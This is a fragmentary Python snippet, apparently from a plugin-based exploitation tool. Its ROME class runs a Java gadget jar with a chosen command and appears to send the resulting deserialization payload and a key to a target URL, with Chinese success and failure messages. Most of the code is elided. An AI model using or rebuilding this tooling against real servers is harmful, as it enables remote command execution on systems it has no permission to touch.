...
@Idea.plugin_register('Class24:ROME')
class ROME(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'ROME', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****ROME模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****ROME模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
